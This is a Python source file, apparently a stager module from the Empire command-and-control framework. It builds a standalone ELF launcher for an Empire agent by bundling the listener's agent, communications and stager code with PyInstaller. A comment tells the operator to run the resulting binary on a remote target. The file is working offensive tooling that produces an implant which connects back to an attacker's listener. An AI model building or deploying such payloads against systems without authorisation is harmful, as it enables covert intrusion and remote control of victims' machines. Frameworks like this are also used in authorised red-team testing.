import shutil
import subprocess
import time
from pathlib import Path

from empire.server.core.exceptions import StagerGenerationException

"""

Install steps...

- install pyInstaller
-- try:


- copy into stagers directory
-- ./Empire/lib/stagers/

- kick off the empire agent on a remote target
-- /tmp/empire &

@TweekFawkes

"""


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "pyInstaller Launcher",
            "Authors": [
                {
                    "Name": "Bryce Kunz",
                    "Handle": "@TweekFawkes",
                    "Link": "https://twitter.com/TweekFawkes",
                }
            ],
            "Description": "Generates an ELF binary payload launcher for Empire using pyInstaller.",
            "Comments": [],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "python",
                "SuggestedValues": ["python"],
                "Strict": True,
            },
            "BinaryFile": {
                "Description": "File to output launcher to.",
                "Required": True,
                "Value": "/tmp/empire",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "launcher",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        binary_file_str = self.options["BinaryFile"]["Value"]
        encode = False

        if shutil.which("pyinstaller") is None:
            raise StagerGenerationException("pyInstaller is not installed.")

        launcher = self.mainMenu.stagergenv2.generate_launcher(
            listener_name=listener_name,
            language=language,
            encode=encode,
            user_agent=user_agent,
        )
        if not launcher:
            raise StagerGenerationException("Error in launcher command generation.")

        active_listener = self.mainMenu.listenersv2.get_active_listener_by_name(
            listener_name
        )

        agent_code = active_listener.generate_agent(
            active_listener.options, language=language
        )
        comms_code = active_listener.generate_comms(
            active_listener.options, language=language
        )

        stager_code = active_listener.generate_stager(
            active_listener.options,
            language=language,
            encrypt=False,
            encode=False,
        )

        imports_list = []
        for code in [agent_code, comms_code, stager_code]:
            for line in code.splitlines():
                _line = line.strip()
                if _line.startswith("from System"):
                    # Skip Ironpython imports
                    pass
                elif _line.startswith("import ") or _line.startswith("from "):
                    imports_list.append(_line)

        imports_list.append("import trace")
        imports_list.append("import json")
        imports_list = list(set(imports_list))
        imports_str = "\n".join(imports_list)
        launcher = imports_str + "\n" + launcher

        binary_path = Path(binary_file_str)
        binary_path.with_suffix(".py").write_text(f"{launcher}")

        subprocess.run(
            [
                "pyinstaller",
                "-y",
                "--clean",
                "--specpath",
                str(binary_path.parent),
                "--distpath",
                str(binary_path.parent),
                "--workpath",
                "/tmp/" + str(time.time()) + "-build/",
                "--onefile",
                str(binary_path.with_suffix(".py")),
            ],
            check=False,
        )

        return binary_path.read_bytes()
